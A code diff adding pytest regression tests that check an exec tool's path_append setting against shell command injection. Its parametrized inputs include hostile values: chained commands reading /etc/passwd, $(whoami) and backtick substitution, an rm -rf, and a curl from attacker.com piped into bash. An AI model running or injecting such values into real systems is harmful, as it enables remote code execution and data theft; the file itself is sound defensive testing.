@@ -74,3 +74,50 @@ async def test_exec_allowed_env_keys_missing_var_ignored(monkeypatch):
     tool = ExecTool(allowed_env_keys=["NONEXISTENT_VAR_12345"])
     result = await tool.execute(command="printenv NONEXISTENT_VAR_12345")
     assert "Exit code: 1" in result
+
+
+@_UNIX_ONLY
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "malicious_path",
+    [
+        '/tmp/bin; echo INJECTED',
+        '/tmp/bin; echo $(whoami)',
+        "/tmp/bin; echo `id`",
+        '/tmp/bin; cat /etc/passwd',
+        '/tmp/bin && curl http://attacker.com/shell.sh | bash',
+        '/tmp/bin\necho INJECTED',
+        '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
+    ],
+)
+async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path):
+    """Shell metacharacters in path_append must not be interpreted as commands."""
+    tool = ExecTool(path_append=malicious_path)
+    result = await tool.execute(command="echo SAFE_OUTPUT")
+
+    assert "SAFE_OUTPUT" in result
+    assert "INJECTED" not in result
+    assert "root:" not in result
+
+
+@_UNIX_ONLY
+@pytest.mark.asyncio
+async def test_exec_path_append_command_substitution_does_not_execute(tmp_path):
+    """$() in path_append must not trigger command substitution."""
+    marker = tmp_path / "secret_marker.txt"
+    marker.write_text("SHOULD_NOT_APPEAR")
+
+    tool = ExecTool(path_append=f'/tmp/bin; echo $(cat {marker})')
+    result = await tool.execute(command="echo OK")
+
+    assert "OK" in result
+    assert "SHOULD_NOT_APPEAR" not in result
+
+
+@_UNIX_ONLY
+@pytest.mark.asyncio
+async def test_exec_path_append_legitimate_path_still_works():
+    """A normal path_append value should still update PATH."""
+    tool = ExecTool(path_append="/opt/custom/bin")
+    result = await tool.execute(command="echo $PATH")
+    assert "/opt/custom/bin" in result
